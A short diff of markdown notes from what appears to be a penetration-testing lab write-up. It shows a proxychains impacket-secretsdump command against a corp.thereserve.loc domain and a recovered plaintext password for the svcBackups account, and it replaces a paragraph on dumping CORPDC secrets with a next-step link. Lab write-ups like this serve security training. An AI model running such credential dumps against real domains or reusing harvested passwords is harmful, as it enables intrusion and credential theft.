@@ -21,6 +21,5 @@ $ `proxychains4 -q /usr/bin/impacket-secretsdump corp.thereserve.loc/svcScanning
 	- <font color="#00b050">svcBackups@corp.thereserve.loc:</font>
 	- q9nzssaFtGHdqUV3Qv6G
 
-## With svcBackups
-Perform the same technique and dump secrets from the CORPDC machine, we will use the `svcBackups` account.
 
+**Next step:** [[Dumping secrets from CORPDC]]
